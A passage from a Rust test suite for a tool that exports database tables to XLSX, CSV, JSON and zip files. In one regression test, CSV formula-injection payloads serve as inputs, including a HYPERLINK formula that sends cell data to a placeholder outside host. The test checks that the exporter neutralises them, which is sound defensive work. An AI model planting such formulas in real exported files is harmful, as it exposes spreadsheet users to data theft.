    let dados: Value = serde_json::from_str(&texto).unwrap();
    assert_eq!((resumo.linhas, resumo.bytes), (1, bruto.len() as u64));
    assert_eq!(
        dados,
        json!([{"id": 1, "nome": "Ana Brandão", "grande": GRANDE, "foto": "AP9kYWRvcw==", "nulo": null,
                "preco": 3.25, "mais": "Infinity", "menos": "-Infinity", "aspas": "com \"aspas\"", "quebra": "a\nb"}])
    );
    assert_eq!(dados[0]["grande"].as_i64(), Some(9_007_199_254_740_993));
    assert_eq!(STANDARD.decode(dados[0]["foto"].as_str().unwrap()).unwrap(), b"\x00\xffdados");
    assert!(texto.contains("\n    \"nome\": \"Ana Brandão\",")); // indentado com 2 espaços por nível
    assert!(texto.starts_with("[\n  {\n    \"id\": 1,\n") && texto.ends_with("\n  }\n]\n"));
}

#[test]
fn json_colunas_repetidas() {
    let pasta = Pasta::nova("repetidas");
    let destino = pasta.join("repetidas.json");
    exportar(&["a", "a", "b", "a"], vec![vec![int(1), int(2), int(3), int(4)]], Formato::Json, &destino);
    assert_eq!(ler_json(&destino), json!([{"a": 1, "a_2": 2, "b": 3, "a_3": 4}]));
}

#[test]
fn json_repetida_nao_toma_nome_de_coluna_real() {
    let pasta = Pasta::nova("repetidas2");
    let destino = pasta.join("repetidas.json");
    exportar(&["a", "a", "a_2"], vec![vec![int(1), int(2), int(3)]], Formato::Json, &destino);
    assert_eq!(ler_json(&destino), json!([{"a": 1, "a_3": 2, "a_2": 3}]));
}

#[test]
fn json_compacto_e_vazio() {
    let pasta = Pasta::nova("compacto");
    let compacto = pasta.join("compacto.json");
    exportar_com(
        &["x", "y"],
        vec![vec![int(1), txt("um")], vec![int(2), txt("dois")]],
        Formato::Json,
        &compacto,
        &Opcoes { json_indentado: false, ..Opcoes::default() },
    )
    .unwrap();
    let texto = fs::read_to_string(&compacto).unwrap();
    assert!(!texto.contains("  "));
    assert_eq!(texto, "[\n{\"x\":1,\"y\":\"um\"},\n{\"x\":2,\"y\":\"dois\"}\n]\n");
    assert_eq!(ler_json(&compacto), json!([{"x": 1, "y": "um"}, {"x": 2, "y": "dois"}]));

    let vazio = pasta.join("vazio.json");
    assert_eq!(exportar(&["x"], vec![], Formato::Json, &vazio).linhas, 0);
    assert_eq!(ler_json(&vazio), json!([]));
    assert_eq!(fs::read_to_string(&vazio).unwrap(), "[]\n");
}

#[test]
fn json_escapa_controles_e_unicode() {
    let mut saida = Vec::new();
    valores::texto_json(&mut saida, "a\"b\\c\n\r\t\u{8}\u{c}\u{1}\u{1f}\u{7f}ção\u{2028}");
    assert_eq!(String::from_utf8(saida).unwrap(), "\"a\\\"b\\\\c\\n\\r\\t\\b\\f\\u0001\\u001f\u{7f}ção\u{2028}\"");
}

// ---------------------------------------------------------------------------------------------------
// Várias fontes: banco inteiro
// ---------------------------------------------------------------------------------------------------

#[test]
fn zip_de_csvs() {
    let pasta = Pasta::nova("zip");
    let destino = pasta.join("banco.zip");
    let lista: Vec<FonteTeste<'_>> = vec![
        ("clientes", &["id", "nome"], vec![vec![int(1), txt("Carla Coutinho")], vec![int(2), txt("Diego Damasceno")]]),
        ("Clientes", &["id"], vec![vec![int(3)]]),
        ("a/b:c*d?\"e\"<f>|g", &["x"], vec![vec![real(1.5)]]),
        ("CON", &["x"], vec![]),
        ("Tabela com espaço", &["número"], vec![vec![int(1)], vec![NULO]]),
        ("fim. ", &["x"], vec![vec![txt("y")]]),
    ];
    let resumo = exportar_varias(
        fontes(lista),
        Formato::Csv,
        &destino,
        &Opcoes { csv_separador: ';', ..Opcoes::default() },
        None,
        Acompanhamento::default(),
    )
    .unwrap();
    assert_eq!((resumo.caminho.as_path(), resumo.formato), (destino.as_path(), Formato::Csv));
    assert_eq!((resumo.tabelas, resumo.linhas), (6, 7));
    assert_eq!(resumo.bytes, fs::metadata(&destino).unwrap().len());
    let nomes = nomes_no_zip(&destino);
    assert_eq!(
        nomes,
        ["clientes.csv", "Clientes (2).csv", "a_b_c_d__e__f__g.csv", "_CON.csv", "Tabela com espaço.csv", "fim.csv"]
    );
    let mut pacote = abrir_zip(&destino);
    for i in 0..pacote.len() {
        let mut arquivo = pacote.by_index(i).unwrap();
        assert_eq!(arquivo.compression(), zip::CompressionMethod::Deflated);
        let mut dados = Vec::new();
        arquivo.read_to_end(&mut dados).unwrap(); // confere o CRC
    }
    let conteudo: HashMap<String, Vec<u8>> = nomes.iter().map(|n| (n.clone(), parte_bytes(&destino, n))).collect();
    assert!(conteudo.values().all(|b| b.starts_with(b"\xef\xbb\xbf")));
    assert_eq!(sem_bom(&conteudo["clientes.csv"]), "id;nome\r\n1;Carla Coutinho\r\n2;Diego Damasceno\r\n");
    assert_eq!(sem_bom(&conteudo["a_b_c_d__e__f__g.csv"]), "x\r\n1,5\r\n");
    assert_eq!(sem_bom(&conteudo["_CON.csv"]), "x\r\n");
    // linha com um único campo vazio sai como "" (regra do CSV, para não virar linha em branco)
    assert_eq!(sem_bom(&conteudo["Tabela com espaço.csv"]), "número\r\n1\r\n\"\"\r\n");
    assert_eq!(pasta.arquivos(), ["banco.zip"]);
}

#[test]
fn zip_troca_extensao_csv_por_zip() {
    let pasta = Pasta::nova("troca");
    let um = || -> Vec<FonteTeste<'_>> { vec![("t", &["a"], vec![vec![int(1)]])] };
    let resumo = varias(um(), Formato::Csv, &pasta.join("banco.csv")).unwrap();
    assert_eq!(resumo.caminho, pasta.join("banco.zip"));
    assert_eq!(pasta.arquivos(), ["banco.zip"]);
    let sem_extensao = varias(um(), Formato::Csv, &pasta.join("copia")).unwrap();
    assert_eq!(sem_extensao.caminho, pasta.join("copia.zip"));
}

#[test]
fn json_do_banco() {
    let pasta = Pasta::nova("json_banco");
    let destino = pasta.join("banco.json");
    let lista: Vec<FonteTeste<'_>> = vec![
        ("clientes", &["id", "nome"], vec![vec![int(1), txt("Elisa Esteves")]]),
        ("produtos", &["codigo", "serie", "foto"], vec![vec![txt("P004"), int(GRANDE), blob(b"\x01\x02\x03")]]),
        ("vazia", &["x"], vec![]),
        ("clientes", &["id"], vec![vec![int(9)]]),
    ];
    let meta = Meta { banco: Some("exemplo.db".into()), exportado_em: None };
    let resumo = exportar_varias(
        fontes(lista),
        Formato::Json,
        &destino,
        &Opcoes::default(),
        Some(meta),
        Acompanhamento::default(),
    )
    .unwrap();
    let texto = fs::read_to_string(&destino).unwrap();
    let dados: Value = serde_json::from_str(&texto).unwrap();
    assert_eq!((resumo.tabelas, resumo.linhas, resumo.formato), (4, 3, Formato::Json));
    let posicao = |chave: &str| texto.find(&format!("\"{chave}\":")).unwrap();
    assert!(posicao("banco") < posicao("exportado_em") && posicao("exportado_em") < posicao("tabelas"));
    assert_eq!(dados.as_object().unwrap().len(), 3);
    assert_eq!(dados["banco"], "exemplo.db");
    chrono::NaiveDateTime::parse_from_str(dados["exportado_em"].as_str().unwrap(), "%Y-%m-%dT%H:%M:%S").unwrap();
    assert_eq!(
        dados["tabelas"],
        json!({
            "clientes": [{"id": 1, "nome": "Elisa Esteves"}],
            "produtos": [{"codigo": "P004", "serie": GRANDE, "foto": "AQID"}],
            "vazia": [],
            "clientes_2": [{"id": 9}],
        })
    );
    assert!(texto.starts_with("{\n  \"banco\": \"exemplo.db\",\n  \"exportado_em\": \""));
    assert!(texto.contains("\n  \"tabelas\": {\n    \"clientes\": [\n      {\n        \"id\": 1,\n"));
    assert!(texto.contains("\n    \"vazia\": [],") && texto.ends_with("\n    ]\n  }\n}\n"));
}

#[test]
fn json_do_banco_compacto_e_sem_tabelas() {
    let pasta = Pasta::nova("json_banco2");
    let compacto = pasta.join("compacto.json");
    let meta = Meta { banco: Some("b.db".into()), exportado_em: Some("2026-09-22T10:31:00".into()) };
    let lista: Vec<FonteTeste<'_>> = vec![("a", &["x"], vec![vec![int(1)], vec![int(2)]])];
    exportar_varias(
        fontes(lista),
        Formato::Json,
        &compacto,
        &Opcoes { json_indentado: false, ..Opcoes::default() },
        Some(meta),
        Acompanhamento::default(),
    )
    .unwrap();
    assert_eq!(
        ler_json(&compacto),
        json!({"banco": "b.db", "exportado_em": "2026-09-22T10:31:00", "tabelas": {"a": [{"x": 1}, {"x": 2}]}})
    );
    assert_eq!(
        fs::read_to_string(&compacto).unwrap(),
        "{\"banco\":\"b.db\",\"exportado_em\":\"2026-09-22T10:31:00\",\"tabelas\":{\n\"a\":[\n{\"x\":1},\n{\"x\":2}\n]\n}}\n"
    );

    let nada = pasta.join("nada.json");
    let resumo = varias(vec![], Formato::Json, &nada).unwrap();
    let dados = ler_json(&nada);
    assert_eq!(resumo.tabelas, 0);
    assert_eq!(dados["banco"], Value::Null);
    assert_eq!(dados["tabelas"], json!({}));
}

// ---------------------------------------------------------------------------------------------------
// Fluxo: uma passada só, sem deixar lixo
// ---------------------------------------------------------------------------------------------------

/// Linhas que só aceitam ser percorridas uma vez, como um cursor (aqui garantido pelo próprio tipo: o
/// iterador é consumido; o teste confere que foi lido inteiro uma única vez).
struct UmaVez {
    linhas: Vec<Vec<Valor>>,
    usos: Arc<AtomicUsize>,
}

impl IntoIterator for UmaVez {
    type Item = Resultado<Vec<Valor>>;
    type IntoIter = std::vec::IntoIter<Resultado<Vec<Valor>>>;

    fn into_iter(self) -> Self::IntoIter {
        assert_eq!(self.usos.fetch_add(1, Ordering::SeqCst), 0, "percorrido mais de uma vez");
        ok(self.linhas).into_iter()
    }
}

#[test]
fn iteravel_percorrido_uma_vez() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("uma_vez");
        let usos = Arc::new(AtomicUsize::new(0));
        let linhas = UmaVez { linhas: linhas_numeradas(450), usos: Arc::clone(&usos) };
        let resumo = exportar_linhas(
            &cols(&["n", "texto"]),
            linhas,
            formato,
            &pasta.join(&format!("saida.{formato}")),
            &Opcoes::default(),
            "dados",
            Acompanhamento::default(),
        )
        .unwrap();
        assert_eq!((usos.load(Ordering::SeqCst), resumo.linhas), (1, 450));
    }
}

#[test]
fn varias_fontes_percorridas_uma_vez() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("varias_uma_vez");
        let usos: Vec<Arc<AtomicUsize>> = (0..2).map(|_| Arc::new(AtomicUsize::new(0))).collect();
        let lista = vec![
            (
                "t0".to_string(),
                cols(&["n"]),
                UmaVez { linhas: (0..250).map(|i| vec![int(i)]).collect(), usos: Arc::clone(&usos[0]) },
            ),
            (
                "t1".to_string(),
                cols(&["n"]),
                UmaVez { linhas: (0..3).map(|i| vec![int(i)]).collect(), usos: Arc::clone(&usos[1]) },
            ),
        ];
        let resumo = exportar_varias(
            lista,
            formato,
            &pasta.join(&format!("banco.{formato}")),
            &Opcoes::default(),
            None,
            Acompanhamento::default(),
        )
        .unwrap();
        assert_eq!(usos.iter().map(|u| u.load(Ordering::SeqCst)).collect::<Vec<_>>(), [1, 1]);
        assert_eq!((resumo.tabelas, resumo.linhas), (2, 253));
    }
}

#[test]
fn erro_no_meio_apaga_temporario_e_preserva_destino() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("erro_meio");
        let destino = pasta.join(&format!("saida.{formato}"));
        fs::write(&destino, b"conteudo antigo").unwrap();
        let erro = exportar_linhas(
            &cols(&["n", "texto"]),
            falha_no_meio(300, falha_simulada()),
            formato,
            &destino,
            &Opcoes::default(),
            "dados",
            Acompanhamento::default(),
        )
        .unwrap_err();
        assert!(erro.mensagem.contains("Falha simulada"), "{formato}: {erro}");
        assert_eq!(pasta.arquivos(), [format!("saida.{formato}")]);
        assert_eq!(fs::read(&destino).unwrap(), b"conteudo antigo");
    }
}

#[test]
fn erro_na_segunda_fonte_apaga_temporario() {
    type Linhas = Box<dyn Iterator<Item = Resultado<Vec<Valor>>>>;
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("erro_segunda");
        let trabalho = Pasta::nova("erro_segunda_trabalho");
        // na hora do erro, o CSV da segunda tabela (no .zip) está aberto na pasta de trabalho
        let na_hora: Arc<Mutex<Option<Vec<String>>>> = Arc::default();
        let (vistos, pasta_trabalho) = (Arc::clone(&na_hora), trabalho.0.clone());
        let primeira: Linhas = Box::new(ok(vec![vec![int(1)], vec![int(2)]]).into_iter());
        let segunda: Linhas = Box::new(ok(linhas_numeradas(250)).into_iter().chain(std::iter::once_with(move || {
            *vistos.lock().unwrap() = Some(conteudo_da_pasta(&pasta_trabalho));
            Err(falha_simulada())
        })));
        let lista = vec![
            ("primeira".to_string(), cols(&["n"]), primeira),
            ("segunda".to_string(), cols(&["n", "texto"]), segunda),
        ];
        let escritor = Escritor::novo(
            formato,
            &pasta.join(&format!("banco.{formato}")),
            &Opcoes::default(),
            true,
            None,
            Acompanhamento::default(),
        )
        .unwrap()
        .com_limites(trabalho_em(&trabalho));
        let r = gravar_fontes(escritor, lista);
        assert!(r.is_err(), "{formato}");
        assert!(pasta.arquivos().is_empty(), "{formato}: {:?}", pasta.arquivos());
        let abertos = na_hora.lock().unwrap().clone().unwrap();
        // fora do Windows, o arquivo aberto já não tem nome na pasta
        assert_eq!(!abertos.is_empty(), cfg!(windows) && formato == Formato::Csv, "{formato}: {abertos:?}");
        assert!(abertos.iter().all(|n| n.starts_with(arquivo::PREFIXO_TRABALHO)), "{abertos:?}");
        esperar_vazia(&trabalho.0);
    }
}

#[test]
fn erro_do_sqlite_vira_erro_banco() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("erro_sqlite");
        let erro = exportar_linhas(
            &cols(&["n", "texto"]),
            falha_no_meio(10, banco_travado()),
            formato,
            &pasta.join(&format!("saida.{formato}")),
            &Opcoes::default(),
            "dados",
            Acompanhamento::default(),
        )
        .unwrap_err();
        assert_eq!(erro.status, 409);
        assert!(erro.mensagem.contains("Não foi possível ler os dados para exportar."), "{erro}");
        assert_eq!(
            erro.mensagem,
            "Não foi possível ler os dados para exportar. O banco está em uso por outro programa. Feche-o lá e tente de novo."
        );
        assert!(pasta.arquivos().is_empty());
    }
}

#[cfg(windows)]
#[test]
fn destino_aberto_em_outro_programa() {
    use std::os::windows::fs::OpenOptionsExt;
    let pasta = Pasta::nova("aberto");
    let destino = pasta.join("aberto.csv");
    fs::write(&destino, b"antigo").unwrap();
    {
        // aberto como os outros programas abrem: sem FILE_SHARE_DELETE (só leitura e escrita compartilhadas)
        let _aberto = fs::OpenOptions::new().read(true).share_mode(0x1 | 0x2).open(&destino).unwrap();
        let erro = exportar_com(&["a"], vec![vec![int(1)]], Formato::Csv, &destino, &Opcoes::default()).unwrap_err();
        assert_eq!(erro.status, 403, "{erro}");
        assert!(erro.mensagem.contains("aberto em outro programa"), "{erro}");
        assert!(erro.mensagem.starts_with("Não foi possível gravar o arquivo exportado."), "{erro}");
    }
    assert_eq!(pasta.arquivos(), ["aberto.csv"]);
    assert_eq!(fs::read(&destino).unwrap(), b"antigo");
}

#[test]
fn destino_existente_e_substituido() {
    for formato in Formato::TODOS {
        let pasta = Pasta::nova("substitui");
        let destino = pasta.join(&format!("saida.{formato}"));
        fs::write(&destino, b"antigo").unwrap();
        let resumo = exportar(&["a"], vec![vec![int(1)]], formato, &destino);
        assert_ne!(fs::read(&destino).unwrap(), b"antigo");
        assert_eq!(resumo.bytes, fs::metadata(&destino).unwrap().len());
        assert_eq!(pasta.arquivos(), [format!("saida.{formato}")]);
    }
}

#[test]
fn escritor_descartado_sem_concluir_apaga_o_temporario() {
    for formato in Formato::TODOS {
        for varias in [false, true] {
            let pasta = Pasta::nova("descartado");
            let trabalho = Pasta::nova("descartado_trabalho");
            let destino = pasta.join(&format!("saida.{formato}"));
            fs::write(&destino, b"antigo").unwrap();
            {
                let mut escritor =
                    Escritor::novo(formato, &destino, &Opcoes::default(), varias, None, Acompanhamento::default())
                        .unwrap()
                        .com_limites(trabalho_em(&trabalho));
                escritor.comecar_tabela("t", &cols(&["a", "b"])).unwrap();
                for linha in linhas_numeradas(1500) {
                    escritor.linha(&linha).unwrap();
                }
                assert_eq!(escritor.linhas(), 1500);
                if varias {
                    escritor.terminar_tabela().unwrap();
                    escritor.comecar_tabela("u", &cols(&["a"])).unwrap();
                    escritor.linha(&[int(1)]).unwrap();
                }
                assert_eq!(pasta.arquivos().len(), 2, "o temporário fica ao lado do destino");
                // o CSV da tabela "u" do .zip, aberto (fora do Windows, o nome já saiu da pasta)
                let abertos = trabalho.arquivos();
                assert_eq!(!abertos.is_empty(), cfg!(windows) && varias && formato == Formato::Csv, "{abertos:?}");
            }
            assert_eq!(pasta.arquivos(), [format!("saida.{formato}")]);
            assert_eq!(fs::read(&destino).unwrap(), b"antigo");
            esperar_vazia(&trabalho.0);
        }
    }
}

#[test]
fn arquivo_de_trabalho_some_quando_o_handle_fecha() {
    // apagado pelo sistema ao fechar: ninguém chama arquivo::remover aqui
    use std::io::Write as _;
    let trabalho = Pasta::nova("trabalho_fecha");
    let (caminho, mut aberto) = arquivo::criar_temporario_de_trabalho(Some(&trabalho.0)).unwrap();
    aberto.write_all(&vec![b'x'; 3 * 1024 * 1024]).unwrap();
    aberto.flush().unwrap();
    let nome = caminho.file_name().unwrap().to_string_lossy().into_owned();
    assert!(nome.starts_with(arquivo::PREFIXO_TRABALHO) && nome.ends_with(".tmp"), "{nome}");
    assert_eq!(caminho.parent(), Some(trabalho.0.as_path()));
    if cfg!(windows) {
        assert_eq!(trabalho.arquivos(), [nome]);
    } else {
        assert!(trabalho.arquivos().is_empty()); // fora do Windows o nome sai logo depois de criado
    }
    drop(aberto);
    esperar_vazia(&trabalho.0);
}

/// O processo que morre no meio da exportação (a janela fechada com a exportação numa thread de fundo, um
/// travamento, o Gerenciador de Tarefas) não passa por nenhum `Drop`, e mesmo assim o CSV de trabalho do
/// .zip, que pode ter vários GB, não fica para trás. O teste roda a si mesmo num processo filho.
#[test]
fn arquivo_de_trabalho_some_se_o_processo_morre() {
    const VARIAVEL: &str = "EXPORTAR_TESTE_PROCESSO_QUE_MORRE";
    if let Some(pasta) = std::env::var_os(VARIAVEL) {
        // o filho: começa o .zip, deixa o CSV da tabela aberto e sai sem descartar nada
        let pasta = PathBuf::from(pasta);
        let trabalho = pasta.join("trabalho");
        let limites = Limites { pasta_trabalho: Some(trabalho.clone()), ..Limites::default() };
        let mut escritor = Escritor::novo(
            Formato::Csv,
            &pasta.join("banco.zip"),
            &Opcoes::default(),
            true,
            None,
            Acompanhamento::default(),
        )
        .unwrap()
        .com_limites(limites);
        escritor.comecar_tabela("t", &cols(&["n", "texto"])).unwrap();
        for linha in linhas_numeradas(50_000) {
            escritor.linha(&linha).unwrap();
        }
        fs::write(pasta.join("visto.txt"), conteudo_da_pasta(&trabalho).join("\n")).unwrap();
        std::process::exit(0);
    }
    let pasta = Pasta::nova("processo");
    let trabalho = pasta.join("trabalho");
    fs::create_dir(&trabalho).unwrap();
    let saida = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["testes::arquivo_de_trabalho_some_se_o_processo_morre", "--exact", "--test-threads=1", "--nocapture"])
        .env(VARIAVEL, &pasta.0)
        .output()
        .unwrap();
    assert!(
        saida.status.success(),
        "o processo filho falhou: {}\n{}",
        String::from_utf8_lossy(&saida.stdout),
        String::from_utf8_lossy(&saida.stderr)
    );
    let visto = fs::read_to_string(pasta.join("visto.txt")).unwrap();
    if cfg!(windows) {
        // o filho chegou a ter o CSV aberto na pasta de trabalho
        assert!(visto.starts_with(arquivo::PREFIXO_TRABALHO) && !visto.contains('\n'), "{visto:?}");
    }
    esperar_vazia(&trabalho);
    // o temporário ao lado do destino sobra (o ~nome)
    assert!(pasta.arquivos().iter().any(|n| n.starts_with("~banco.zip.")), "{:?}", pasta.arquivos());
}

#[test]
fn erro_guardado_volta_nas_chamadas_seguintes() {
    let pasta = Pasta::nova("guardado");
    let destino = pasta.join("saida.xlsx");
    let pare =
        ErroBanco::com_status("Exportação interrompida; nenhum arquivo foi gravado.", 409).codigo(Codigo::Cancelado);
    let devolver = pare.clone();
    let acomp = Acompanhamento::default().ao_tabela(move |_, _| Err(devolver.clone()));
    let mut escritor = Escritor::novo(Formato::Xlsx, &destino, &Opcoes::default(), true, None, acomp).unwrap();
    assert_eq!(escritor.comecar_tabela("t", &cols(&["a"])), Err(pare.clone()));
    assert!(pasta.arquivos().is_empty(), "o temporário sai na hora do erro");
    assert_eq!(escritor.linha(&[int(1)]), Err(pare.clone()));
    assert_eq!(escritor.terminar_tabela(), Err(pare.clone()));
    assert_eq!(escritor.concluir(), Err(pare));
    assert!(pasta.arquivos().is_empty());
}

#[test]
fn escritor_de_uma_fonte_recusa_a_segunda_e_conclui_sem_nenhuma() {
    let pasta = Pasta::nova("uma_fonte");
    let destino = pasta.join("saida.csv");
    let mut escritor =
        Escritor::novo(Formato::Csv, &destino, &Opcoes::default(), false, None, Acompanhamento::default()).unwrap();
    escritor.comecar_tabela("t", &cols(&["a"])).unwrap();
    assert_eq!(escritor.comecar_tabela("u", &cols(&["a"])).unwrap_err().status, 500);
    assert!(pasta.arquivos().is_empty());

    let vazio = pasta.join("vazio.json");
    let escritor =
        Escritor::novo(Formato::Json, &vazio, &Opcoes::default(), false, None, Acompanhamento::default()).unwrap();
    let resumo = escritor.concluir().unwrap();
    assert_eq!((resumo.tabelas, resumo.linhas), (1, 0));
    assert_eq!(fs::read_to_string(&vazio).unwrap(), "[]\n");

    let mut sem_tabela =
        Escritor::novo(Formato::Csv, &destino, &Opcoes::default(), false, None, Acompanhamento::default()).unwrap();
    assert_eq!(sem_tabela.linha(&[int(1)]).unwrap_err().status, 500);
}

#[test]
fn escritor_e_send() {
    fn exige_send<T: Send>() {}
    exige_send::<Escritor>();
    exige_send::<Acompanhamento>();
    exige_send::<Resumo>();
}

// ---------------------------------------------------------------------------------------------------
// Argumentos inválidos
// ---------------------------------------------------------------------------------------------------

#[test]
fn pasta_de_destino_inexistente() {
    let pasta = Pasta::nova("inexistente");
    let destino = pasta.join("nao_existe").join("saida.csv");
    let erro = exportar_com(&["a"], vec![vec![int(1)]], Formato::Csv, &destino, &Opcoes::default()).unwrap_err();
    assert!(erro.mensagem.contains("pasta de destino não existe"), "{erro}");
    assert_eq!(erro.status, 404);
    assert!(!destino.parent().unwrap().exists());
    let lista: Vec<FonteTeste<'_>> = vec![("t", &["a"], vec![vec![int(1)]])];
    assert!(varias(lista, Formato::Json, &destino).is_err());
}

#[test]
fn destino_que_e_pasta_ou_vazio() {
    let pasta = Pasta::nova("e_pasta");
    let erro = exportar_com(&["a"], vec![vec![int(1)]], Formato::Json, &pasta.0, &Opcoes::default()).unwrap_err();
    assert!(erro.mensagem.contains("é uma pasta"), "{erro}");
    for vazio in ["", "   "] {
        let erro =
            exportar_com(&["a"], vec![vec![int(1)]], Formato::Csv, Path::new(vazio), &Opcoes::default()).unwrap_err();
        assert_eq!(erro.mensagem, "Informe o caminho do arquivo de destino.");
    }
}

#[test]
fn formato_e_opcoes_invalidos() {
    let pasta = Pasta::nova("invalidos");
    let erro = Formato::de_texto("pdf").unwrap_err();
    assert_eq!(erro.mensagem, "Formato de exportação desconhecido: pdf. Use xlsx, csv ou json.");
    let csv = pasta.join("x.csv");
    let erro = exportar_com(
        &["a"],
        vec![vec![int(1)]],
        Formato::Csv,
        &csv,
        &Opcoes { csv_separador: '|', ..Opcoes::default() },
    )
    .unwrap_err();
    assert!(erro.mensagem.contains("Separador de CSV inválido"), "{erro}");
    let erro =
        exportar_com(&["a"], vec![vec![int(1)]], Formato::Csv, &csv, &Opcoes { csv_decimal: ';', ..Opcoes::default() })
            .unwrap_err();
    assert!(erro.mensagem.contains("Separador decimal inválido"), "{erro}");
    assert!(pasta.arquivos().is_empty());
    let formato = Formato::de_texto(".XLSX").unwrap();
    assert_eq!(exportar(&["a"], vec![vec![int(1)]], formato, &pasta.join("x.xlsx")).formato, Formato::Xlsx);
    assert_eq!(Formato::de_texto(" Json ").unwrap().como_str(), "json");
}

// ---------------------------------------------------------------------------------------------------
// Desempenho
// ---------------------------------------------------------------------------------------------------

#[test]
fn desempenho_excel_100_mil_linhas() {
    let pasta = Pasta::nova("desempenho");
    let destino = pasta.join("grande.xlsx");
    let linhas = (0..100_000i64).map(|i| {
        Ok::<_, ErroBanco>(vec![
            int(i),
            txt(&format!("Cliente {i}")),
            real(i as f64 * 1.25),
            if i % 9 == 0 { NULO } else { txt("São Paulo") },
            int(i % 2),
            txt(&format!("2026-09-{:02}", i % 28 + 1)),
        ])
    });
    let inicio = Instant::now();
    let resumo = exportar_linhas(
        &cols(&["id", "nome", "valor", "cidade", "ativo", "data"]),
        linhas,
        Formato::Xlsx,
        &destino,
        &Opcoes::default(),
        "dados",
        Acompanhamento::default(),
    )
    .unwrap();
    let duracao = inicio.elapsed();
    assert_eq!(resumo.linhas, 100_000);
    assert!(duracao.as_secs() < 30, "levou {duracao:?}");
    let xml = xml_da_planilha(&destino, 1);
    assert!(xml.contains("<row r=\"100001\"") && !xml.contains("<row r=\"100002\""));
    assert!(xml.contains("<autoFilter ref=\"A1:F100001\""));
}

// ---------------------------------------------------------------------------------------------------
// Regressões dos achados da revisão
// ---------------------------------------------------------------------------------------------------

#[test]
fn csv_protege_textos_que_o_excel_executaria_como_formula() {
    let pasta = Pasta::nova("protege");
    let destino = pasta.join("formulas.csv");
    let valores = [
        "=HYPERLINK(\"https://example.test/?d=\"&A2,\"ver\")",
        "=1+1",
        "+1+1",
        "-1+1",
        "@SOMA(1;1)",
        "\t=1+1",
        "\r=1",
        "-5",
        "+1,5",
        "texto comum",
        "a=b",
    ];
    let mut linhas: Vec<Vec<Valor>> =
        valores.iter().enumerate().map(|(i, v)| vec![int(i as i64 + 1), txt(v)]).collect();
    linhas[10][0] = int(-11);
    exportar(&["id", "valor"], linhas, Formato::Csv, &destino);
    let lidas = ler_csv(&destino, ';');
    let segunda: Vec<&str> = lidas[1..].iter().map(|l| l[1].as_str()).collect();
    assert_eq!(
        segunda,
        [
            "'=HYPERLINK(\"https://example.test/?d=\"&A2,\"ver\")",
            "'=1+1",
            "'+1+1",
            "'-1+1",
            "'@SOMA(1;1)",
            "'\t=1+1",
            "'\r=1",
            "-5",
            "+1,5",
            "texto comum",
            "a=b",
        ]
    );
    assert_eq!(lidas.last().unwrap()[0], "-11"); // número de verdade não muda
    let sem = pasta.join("sem_protecao.csv");
    let opcoes = Opcoes { csv_proteger_formulas: false, ..Opcoes::default() };
    exportar_com(&["valor"], vec![vec![txt("=1+1")]], Formato::Csv, &sem, &opcoes).unwrap();
    assert_eq!(ler_csv(&sem, ';')[1], ["=1+1"]);
}

#[test]
fn csv_do_banco_inteiro_tambem_protege() {
    let pasta = Pasta::nova("protege_zip");
    let destino = pasta.join("banco.zip");
    let lista: Vec<FonteTeste<'_>> = vec![("t", &["v"], vec![vec![txt("=1+1")]])];
    varias(lista, Formato::Csv, &destino).unwrap();
    assert_eq!(sem_bom(&parte_bytes(&destino, "t.csv")), "v\r\n'=1+1\r\n");
}

#[test]
fn excel_blob_grande_vira_aviso_e_o_resumo_conta() {
    let pasta = Pasta::nova("blobs");
    let destino = pasta.join("blobs.xlsx");
    let pequeno: Vec<u8> = (0..=255u8).cycle().take(2560).collect();
    let grande = vec![7u8; 60_000];
    let resumo = exportar(
        &["id", "anexo", "texto"],
        vec![
            vec![int(1), blob(&pequeno), txt(&"x".repeat(40_000))],
            vec![int(2), blob(&grande), txt("curto")],
            vec![int(3), blob(&grande), txt(&"y".repeat(32_767))],
        ],
        Formato::Xlsx,
        &destino,
    );
    let m = mapa(&xml_da_planilha(&destino, 1));
    assert_eq!(STANDARD.decode(texto_de(&m, "B2")).unwrap(), pequeno);
    assert!(texto_de(&m, "B3").starts_with("[BLOB de 60.000 bytes") && texto_de(&m, "B4") == texto_de(&m, "B3"));
    assert_eq!(texto_de(&m, "C2").chars().count(), LIMITE_TEXTO_EXCEL);
    assert_eq!(
        resumo.avisos,
        [
            "1 célula de texto passou de 32.767 caracteres, o máximo do Excel, e foi cortada.",
            "2 conteúdos binários (BLOB) não couberam numa célula do Excel; ficaram só a indicação do tamanho. \
             Para ter o conteúdo, exporte em CSV ou JSON ou use “Salvar em arquivo”.",
        ]
    );
    assert!(exportar(&["a"], vec![vec![blob(b"ok")]], Formato::Csv, &pasta.join("a.csv")).avisos.is_empty());
}

#[test]
fn excel_real_fora_da_faixa_vai_como_texto() {
    let pasta = Pasta::nova("reais");
    let destino = pasta.join("reais.xlsx");
    let valores = [1.797_693_134_862_315_7e308, -1e308, 9.99999999999999e307, 5e-324, 0.0, 0.300_000_000_000_000_04];
    let resumo = exportar(&["r"], valores.iter().map(|v| vec![real(*v)]).collect(), Formato::Xlsx, &destino);
    let m = mapa(&xml_da_planilha(&destino, 1));
    assert_eq!(texto_de(&m, "A2"), "1.7976931348623157e+308");
    assert_eq!(texto_de(&m, "A3"), "-1e+308");
    assert_eq!(texto_de(&m, "A5"), "5e-324");
    assert_eq!(numero_de(&m, "A4").parse::<f64>().unwrap(), 9.99999999999999e307);
    assert_eq!(numero_de(&m, "A6"), "0.0");
    assert_eq!(numero_de(&m, "A7"), "0.30000000000000004");
    assert_eq!(resumo.avisos, ["3 números reais ficaram fora da faixa do Excel e foram gravados como texto."]);
}

#[test]
fn zip_do_banco_nao_substitui_um_zip_que_ninguem_confirmou() {
    use std::io::Write as _;
    let pasta = Pasta::nova("zip_existente");
    let existente = pasta.join("relatorio.zip");
    {
        let mut pacote = zip::ZipWriter::new(fs::File::create(&existente).unwrap());
        pacote.start_file("importante.txt", zip::write::SimpleFileOptions::default()).unwrap();
        pacote.write_all("conteúdo que a pessoa guardou".as_bytes()).unwrap();
        pacote.finish().unwrap();
    }
    let boa = || -> Vec<FonteTeste<'_>> { vec![("boa", &["a"], vec![vec![int(1)]])] };
    let erro = varias(boa(), Formato::Csv, &pasta.join("relatorio.csv")).unwrap_err();
    assert_eq!(erro.status, 409);
